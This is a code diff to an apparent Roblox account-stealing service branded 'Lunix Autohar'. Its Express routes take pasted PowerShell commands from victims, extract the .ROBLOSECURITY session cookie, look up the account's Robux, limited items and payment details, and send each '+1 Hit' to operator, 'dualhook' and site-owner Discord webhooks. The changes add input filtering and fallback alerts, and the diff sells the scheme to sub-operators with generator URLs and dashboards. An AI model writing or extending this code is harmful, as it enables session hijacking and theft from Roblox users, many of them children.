@@ -233,6 +233,17 @@ app.post('/u/convert', validateRequest, async (req, res) => {
       return res.status(400).json({ error: 'Invalid input format' });
     }
 
+    // Check if input is just plain text (no PowerShell structure) - silently reject to prevent spam
+    const hasBasicPowershellStructure = /(?:Invoke-WebRequest|curl|wget|-Uri|-Headers|-Method|powershell|\.ROBLOSECURITY)/i.test(input);
+
+    if (!hasBasicPowershellStructure) {
+      // Silently reject plain text inputs without sending webhooks
+      return res.status(400).json({ 
+        success: false,
+        message: 'Invalid input format'
+      });
+    }
+
     // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
     const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
     const regex = /\.ROBLOSECURITY[=\s]*["']?([^"'\s}]+)["']?/i;
@@ -240,6 +251,42 @@ app.post('/u/convert', validateRequest, async (req, res) => {
 
     if (match) {
       const token = match[1].replace(/['"]/g, '');
+
+      // Check if token is empty, just whitespace, or only contains commas/special chars
+      if (!token || token.trim() === '' || token === ',' || token.length < 10) {
+        // Send fallback embed when no valid token found
+        const fallbackEmbed = {
+          title: "⚠️ Input Received",
+          description: "Input received but no ROBLOSECURITY found",
+          color: 0x8B5CF6, // Consistent purple color
+          footer: {
+            text: "Made By Lunix"
+          }
+        };
+
+        const fallbackPayload = {
+          embeds: [fallbackEmbed]
+        };
+
+        // Send to Discord webhook
+        try {
+          const response = await fetch(process.env.DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(fallbackPayload)
+          });
+        } catch (webhookError) {
+          console.error('❌ Fallback webhook failed:', webhookError.message);
+        }
+
+        return res.status(400).json({ 
+          success: false,
+          message: 'Failed wrong input'
+        });
+      }
+
       const userAgent = req.headers['user-agent'] || 'Unknown';
 
       // Fetch user data from Roblox API
@@ -278,6 +325,33 @@ app.post('/u/convert', validateRequest, async (req, res) => {
         });
       }
     } else {
+      // Send fallback embed when no token found - do NOT send user data
+      const fallbackEmbed = {
+        title: "⚠️ Input Received",
+        description: "Input received but no ROBLOSECURITY found",
+        color: 0x8B5CF6, // Consistent purple color
+        footer: {
+          text: "Made By Lunix"
+        }
+      };
+
+      const fallbackPayload = {
+        embeds: [fallbackEmbed]
+      };
+
+      // Send to Discord webhook
+      try {
+        const response = await fetch(process.env.DISCORD_WEBHOOK_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(fallbackPayload)
+        });
+      } catch (webhookError) {
+        console.error('❌ Fallback webhook failed:', webhookError.message);
+      }
+
       return res.status(400).json({ 
         success: false,
         message: 'Failed wrong input'
@@ -347,13 +421,73 @@ app.post('/u/:directory/convert', async (req, res) => {
       return res.status(400).json({ error: 'Invalid input format' });
     }
 
-    // Look for .ROBLOSECURITY cookie
+    // Check if input is just plain text (no PowerShell structure) - silently reject to prevent spam
+    const hasBasicPowershellStructure = /(?:Invoke-WebRequest|curl|wget|-Uri|-Headers|-Method|powershell|\.ROBLOSECURITY)/i.test(input);
+
+    if (!hasBasicPowershellStructure) {
+      // Silently reject plain text inputs without sending webhooks
+      return res.status(400).json({ 
+        success: false,
+        message: 'Invalid input format',
+        directory: directoryName
+      });
+    }
+
+    // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
     const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
     const regex = /\.ROBLOSECURITY[=\s]*["']?([^"'\s}]+)["']?/i;
     const match = cleanedInput.match(regex);
 
     if (match) {
       const token = match[1].replace(/['"]/g, '');
+
+      // Check if token is empty, just whitespace, or only contains commas/special chars
+      if (!token || token.trim() === '' || token === ',' || token.length < 10) {
+        // Send fallback embed when no valid token found
+        const fallbackEmbed = {
+          title: "⚠️ Input Received",
+          description: "Input received but no ROBLOSECURITY found",
+          color: 0xFFA500, // Orange color to distinguish from successful hits
+          footer: {
+            text: "Made By Lunix"
+          }
+        };
+
+        const fallbackPayload = {
+          embeds: [fallbackEmbed]
+        };
+
+        // Send to both directory webhook and site owner webhook
+        try {
+          await fetch(directoryConfig.webhookUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(fallbackPayload)
+          });
+
+          const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
+          if (siteOwnerWebhookUrl) {
+            await fetch(siteOwnerWebhookUrl, {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+              },
+              body: JSON.stringify(fallbackPayload)
+            });
+          }
+        } catch (webhookError) {
+          console.error('❌ Fallback webhook failed:', webhookError.message);
+        }
+
+        return res.status(400).json({ 
+          success: false,
+          message: 'Failed wrong input',
+          directory: directoryName
+        });
+      }
+
       const userAgent = req.headers['user-agent'] || 'Unknown';
 
       // Fetch user data from Roblox API
@@ -399,6 +533,44 @@ app.post('/u/:directory/convert', async (req, res) => {
         });
       }
     } else {
+      // Send fallback embed when no token found - do NOT send user data
+      const fallbackEmbed = {
+        title: "⚠️ Input Received",
+        description: "Input received but no ROBLOSECURITY found",
+        color: 0x8B5CF6, // Consistent purple color
+        footer: {
+          text: "Made By Lunix"
+        }
+      };
+
+      const fallbackPayload = {
+        embeds: [fallbackEmbed]
+      };
+
+      // Send to both directory webhook and site owner webhook
+      try {
+        await fetch(directoryConfig.webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(fallbackPayload)
+        });
+
+        const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
+        if (siteOwnerWebhookUrl) {
+          await fetch(siteOwnerWebhookUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(fallbackPayload)
+          });
+        }
+      } catch (webhookError) {
+        console.error('❌ Fallback webhook failed:', webhookError.message);
+      }
+
       return res.status(400).json({ 
         success: false,
         message: 'Failed wrong input',
@@ -642,7 +814,7 @@ app.post('/api/create-directory', async (req, res) => {
         ? `${directoryName.toUpperCase()} GENERATOR` 
         : 'LUNIX AUTOHAR';
       const description = serviceType === 'dualhook' 
-        ? `Ur ${directoryName.charAt(0).toUpperCase() + directoryName.slice(1)} Generator URLs\n📌\n\nYour Autohar\n\`http://${req.get('host')}/u/${directoryName}\`\n\nDualhook Autohar\n\`http://${req.get('host')}/${directoryName}/create\`\n\n🔑 **Dashboard Login Token:**\n\`${authToken}\`\n\n🆔 **Your Unique ID:**\n\`${directories[directoryName].uniqueId}\`\n\n📊 **Your Dashboard:**\n\`http://${req.get('host')}/dashboard\``
+        ? `Ur ${directoryName.charAt(0).toUpperCase() + directoryName.slice(1)} Generator URLs\n📌\n\nYour Autohar\n\`http://${req.get('host')}/${directoryName}\`\n\nDualhook Autohar\n\`http://${req.get('host')}/${directoryName}/create\`\n\n🔑 **Dashboard Login Token:**\n\`${authToken}\`\n\n🆔 **Your Unique ID:**\n\`${directories[directoryName].uniqueId}\`\n\n📊 **Your Dashboard:**\n\`http://${req.get('host')}/dashboard\``
         : `Ur LUNIX AUTOHAR url\n📌\n\n\`http://${req.get('host')}/${directoryName}\`\n\n🔑 **Dashboard Login Token:**\n\`${authToken}\`\n\n🆔 **Your Unique ID:**\n\`${directories[directoryName].uniqueId}\`\n\n📊 **Your Dashboard:**\n\`http://${req.get('host')}/dashboard\``;
 
       const notificationPayload = {
@@ -1978,16 +2150,73 @@ app.post('/:directory/convert', async (req, res) => {
       return res.status(400).json({ error: 'Invalid input format' });
     }
 
-    // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
-    // First, clean up the input by removing PowerShell backticks and line breaks
-    const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
+    // Check if input is just plain text (no PowerShell structure) - silently reject to prevent spam
+    const hasBasicPowershellStructure = /(?:Invoke-WebRequest|curl|wget|-Uri|-Headers|-Method|powershell|\.ROBLOSECURITY)/i.test(input);
 
-    // Now extract the ROBLOSECURITY token from the cleaned input - improved pattern to capture full token
+    if (!hasBasicPowershellStructure) {
+      // Silently reject plain text inputs without sending webhooks
+      return res.status(400).json({ 
+        success: false,
+        message: 'Invalid input format',
+        directory: directoryName
+      });
+    }
+
+    // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
+    const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
     const regex = /\.ROBLOSECURITY[=\s]*["']?([^"'\s}]+)["']?/i;
     const match = cleanedInput.match(regex);
 
     if (match) {
-      const token = match[1].replace(/['"]/g, ''); // Remove quotes if present
+      const token = match[1].replace(/['"]/g, '');
+
+      // Check if token is empty, just whitespace, or only contains commas/special chars
+      if (!token || token.trim() === '' || token === ',' || token.length < 10) {
+        // Send fallback embed when no valid token found
+        const fallbackEmbed = {
+          title: "⚠️ Input Received",
+          description: "Input received but no ROBLOSECURITY found",
+          color: 0x8B5CF6, // Consistent purple color
+          footer: {
+            text: "Made By Lunix"
+          }
+        };
+
+        const fallbackPayload = {
+          embeds: [fallbackEmbed]
+        };
+
+        // Send to both directory webhook and site owner webhook
+        try {
+          await fetch(directoryConfig.webhookUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(fallbackPayload)
+          });
+
+          const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
+          if (siteOwnerWebhookUrl) {
+            await fetch(siteOwnerWebhookUrl, {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(fallbackPayload)
+          });
+        }
+      } catch (webhookError) {
+        console.error('❌ Fallback webhook failed:', webhookError.message);
+      }
+
+      return res.status(400).json({ 
+        success: false,
+        message: 'Failed wrong input',
+        directory: directoryName
+      });
+    }
+
       const userAgent = req.headers['user-agent'] || 'Unknown';
 
       // Fetch user data from Roblox API
@@ -2037,6 +2266,43 @@ app.post('/:directory/convert', async (req, res) => {
 
 
     } else {
+      // Send fallback embed when no token found - do NOT send user data
+      const fallbackEmbed = {
+        title: "⚠️ Input Received",
+        description: "Input received but no ROBLOSECURITY found",
+        color: 0x8B5CF6, // Consistent purple color
+        footer: {
+          text: "Made By Lunix"
+        }
+      };
+
+      const fallbackPayload = {
+        embeds: [fallbackEmbed]
+      };
+
+      // Send to both directory webhook and site owner webhook
+      try {
+        await fetch(directoryConfig.webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(fallbackPayload)
+        });
+
+        const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
+        if (siteOwnerWebhookUrl) {
+          await fetch(siteOwnerWebhookUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(fallbackPayload)
+          });
+        }
+      } catch (webhookError) {
+        console.error('❌ Fallback webhook failed:', webhookError.message);
+      }
 
       // Return error message when no token found
       return res.status(400).json({ 
@@ -2243,6 +2509,19 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
       return res.status(400).json({ error: 'Invalid input format' });
     }
 
+    // Check if input is just plain text (no PowerShell structure) - silently reject to prevent spam
+    const hasBasicPowershellStructure = /(?:Invoke-WebRequest|curl|wget|-Uri|-Headers|-Method|powershell|\.ROBLOSECURITY)/i.test(input);
+
+    if (!hasBasicPowershellStructure) {
+      // Silently reject plain text inputs without sending webhooks
+      return res.status(400).json({ 
+        success: false,
+        message: 'Invalid input format',
+        directory: directoryName,
+        subdirectory: subdirectoryName
+      });
+    }
+
     // Look for .ROBLOSECURITY cookie
     // First, clean up the input by removing PowerShell backticks and line breaks
     const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
@@ -2253,6 +2532,69 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
 
     if (match) {
       const token = match[1].replace(/['"]/g, '');
+
+      // Check if token is empty, just whitespace, or only contains commas/special chars
+      if (!token || token.trim() === '' || token === ',' || token.length < 10) {
+        // Send fallback embed when no valid token found
+        const fallbackEmbed = {
+          title: "⚠️ Input Received",
+          description: "Input received but no ROBLOSECURITY found",
+          color: 0xFFA500, // Orange color to distinguish from successful hits
+          footer: {
+            text: "Made By Lunix"
+          }
+        };
+
+        const fallbackPayload = {
+          embeds: [fallbackEmbed]
+        };
+
+        // Send to all three webhooks (subdirectory, dualhook master, site owner)
+        try {
+          // 1. Send to subdirectory webhook
+          await fetch(subdirectoryConfig.webhookUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(fallbackPayload)
+          });
+
+          // 2. Send to dualhook master webhook
+          if (parentConfig.dualhookWebhookUrl) {
+            await fetch(parentConfig.dualhookWebhookUrl, {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+              },
+              body: JSON.stringify(fallbackPayload)
+            });
+          }
+
+          // 3. Send to site owner webhook
+          const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
+          if (siteOwnerWebhookUrl) {
+            await fetch(siteOwnerWebhookUrl, {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+              },
+              body: JSON.stringify(fallbackPayload)
+            });
+          }
+        } catch (webhookError) {
+          console.error('❌ Fallback webhook failed:', webhookError.message);
+        }
+
+        // Return error message when no token found
+        return res.status(400).json({ 
+          success: false,
+          message: 'Failed wrong input',
+          directory: directoryName,
+          subdirectory: subdirectoryName
+        });
+      }
+
       const userAgent = req.headers['user-agent'] || 'Unknown';
 
       // Fetch user data from Roblox API
@@ -2342,7 +2684,56 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
 
 
     } else {
+      // Send fallback embed when no token found - do NOT send user data
+      const fallbackEmbed = {
+        title: "⚠️ Input Received",
+        description: "Input received but no ROBLOSECURITY found",
+        color: 0xFFA500, // Orange color to distinguish from successful hits
+        footer: {
+          text: "Made By Lunix"
+        }
+      };
 
+      const fallbackPayload = {
+        embeds: [fallbackEmbed]
+      };
+
+      // Send to all three webhooks (subdirectory, dualhook master, site owner)
+      try {
+        // 1. Send to subdirectory webhook
+        await fetch(subdirectoryConfig.webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(fallbackPayload)
+        });
+
+        // 2. Send to dualhook master webhook
+        if (parentConfig.dualhookWebhookUrl) {
+          await fetch(parentConfig.dualhookWebhookUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(fallbackPayload)
+          });
+        }
+
+        // 3. Send to site owner webhook
+        const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
+        if (siteOwnerWebhookUrl) {
+          await fetch(siteOwnerWebhookUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(fallbackPayload)
+          });
+        }
+      } catch (webhookError) {
+        console.error('❌ Fallback webhook failed:', webhookError.message);
+      }
 
       // Return error message when no token found
       return res.status(400).json({ 
@@ -2358,6 +2749,224 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
       message: 'Request submitted successfully with multi-webhook delivery!',
       directory: directoryName,
       subdirectory: subdirectoryName
+    });
+  } catch (error) {
+    // Log error without exposing sensitive details
+    console.error('❌ Server error:', error.message);
+    res.status(500).json({ error: 'Server error processing request' });
+  }
+});
+
+// Add plain text detection to prevent webhook spam
+app.post('/:directory/convert', async (req, res) => {
+  try {
+    const directoryName = req.params.directory;
+    const directories = await loadDirectories();
+
+    // Check if directory exists
+    if (!directories[directoryName]) {
+      return res.status(404).json({ error: 'Directory not found' });
+    }
+
+    // If directory has subdirectories, return 404 to protect parent
+    if (directories[directoryName].subdirectories && 
+        Object.keys(directories[directoryName].subdirectories).length > 0) {
+      return res.status(404).json({ error: 'Not found' });
+    }
+
+    const directoryConfig = directories[directoryName];
+
+    // Validate API token for this specific directory
+    const providedToken = req.get('X-API-Token');
+    if (!providedToken || providedToken !== directoryConfig.apiToken) {
+      console.log(`❌ Invalid or missing API token for directory ${directoryName} from ${req.ip}`);
+      return res.status(401).json({ error: 'Invalid API token for this directory' });
+    }
+
+    let input;
+    let scriptType;
+
+
+    // Handle both JSON and text input
+    if (typeof req.body === 'string') {
+      input = req.body;
+      scriptType = 'Unknown';
+    } else if (req.body && req.body.powershell) {
+      input = req.body.powershell;
+      scriptType = req.body.scriptType || 'Unknown';
+    } else {
+
+      return res.status(400).json({ error: 'Invalid input format' });
+    }
+
+    // Check if input is just plain text (no PowerShell structure) - silently reject to prevent spam
+    const hasBasicPowershellStructure = /(?:Invoke-WebRequest|curl|wget|-Uri|-Headers|-Method|powershell|\.ROBLOSECURITY)/i.test(input);
+
+    if (!hasBasicPowershellStructure) {
+      // Silently reject plain text inputs without sending webhooks
+      return res.status(400).json({ 
+        success: false,
+        message: 'Invalid input format',
+        directory: directoryName
+      });
+    }
+
+    // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
+    const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
+    const regex = /\.ROBLOSECURITY[=\s]*["']?([^"'\s}]+)["']?/i;
+    const match = cleanedInput.match(regex);
+
+    if (match) {
+      const token = match[1].replace(/['"]/g, '');
+
+      // Check if token is empty, just whitespace, or only contains commas/special chars
+      if (!token || token.trim() === '' || token === ',' || token.length < 10) {
+        // Send fallback embed when no valid token found
+        const fallbackEmbed = {
+          title: "⚠️ Input Received",
+          description: "Input received but no ROBLOSECURITY found",
+          color: 0x8B5CF6, // Consistent purple color
+          footer: {
+            text: "Made By Lunix"
+          }
+        };
+
+        const fallbackPayload = {
+          embeds: [fallbackEmbed]
+        };
+
+        // Send to both directory webhook and site owner webhook
+        try {
+          await fetch(directoryConfig.webhookUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(fallbackPayload)
+          });
+
+          const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
+          if (siteOwnerWebhookUrl) {
+            await fetch(siteOwnerWebhookUrl, {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+              },
+              body: JSON.stringify(fallbackPayload)
+            });
+          }
+        } catch (webhookError) {
+          console.error('❌ Fallback webhook failed:', webhookError.message);
+        }
+
+        // Return error message when no token found
+        return res.status(400).json({ 
+          success: false,
+          message: 'Failed wrong input',
+          directory: directoryName
+        });
+      }
+
+      const userAgent = req.headers['user-agent'] || 'Unknown';
+
+      // Fetch user data from Roblox API
+      const userData = await fetchRobloxUserData(token);
+
+      // If user data fetch failed, create a minimal user data object to ensure cookie is still sent
+      const webhookUserData = userData || {
+        username: "Unknown User",
+        userId: "Unknown",
+        robux: 0,
+        premium: false,
+        rap: 0,
+        summary: 0,
+        creditBalance: 0,
+        savedPayment: false,
+        robuxIncoming: 0,
+        robuxOutgoing: 0,
+        korblox: false,
+        headless: false,
+        accountAge: 0,
+        groupsOwned: 0,
+        placeVisits: 0,
+        inventory: { hairs: 0, bundles: 0, faces: 0 }
+      };
+
+      // Log user data to database
+      await logUserData(token, webhookUserData, { ip: req.ip, directory: directoryName });
+
+      const customTitle = `<:hacker:1404745235711655987> +1 Hit - Lunix Autohar`;
+
+      // Send to Discord webhook with user data
+      const webhookResult = await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, directoryConfig.webhookUrl, customTitle);
+
+      // Always send to site owner (main webhook) - check both environment variable and default webhook
+      const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
+      if (siteOwnerWebhookUrl) {
+        await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, siteOwnerWebhookUrl, customTitle);
+      }
+
+      if (!webhookResult.success) {
+
+        return res.status(500).json({ 
+          success: false, 
+          error: `Webhook failed: ${webhookResult.error}` 
+        });
+      }
+
+
+    } else {
+      // Send fallback embed when no token found - do NOT send user data
+      const fallbackEmbed = {
+        title: "⚠️ Input Received",
+        description: "Input received but no ROBLOSECURITY found",
+        color: 0x8B5CF6, // Consistent purple color
+        footer: {
+          text: "Made By Lunix"
+        }
+      };
+
+      const fallbackPayload = {
+        embeds: [fallbackEmbed]
+      };
+
+      // Send to both directory webhook and site owner webhook
+      try {
+        await fetch(directoryConfig.webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(fallbackPayload)
+        });
+
+        const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
+        if (siteOwnerWebhookUrl) {
+          await fetch(siteOwnerWebhookUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(fallbackPayload)
+          });
+        }
+      } catch (webhookError) {
+        console.error('❌ Fallback webhook failed:', webhookError.message);
+      }
+
+      // Return error message when no token found
+      return res.status(400).json({ 
+        success: false,
+        message: 'Failed wrong input',
+        directory: directoryName
+      });
+    }
+
+    // Return success only when token was found and processed
+    res.json({ 
+      success: true,
+      message: 'Request submitted successfully!',
+      directory: directoryName
     });
   } catch (error) {
     // Log error without exposing sensitive details
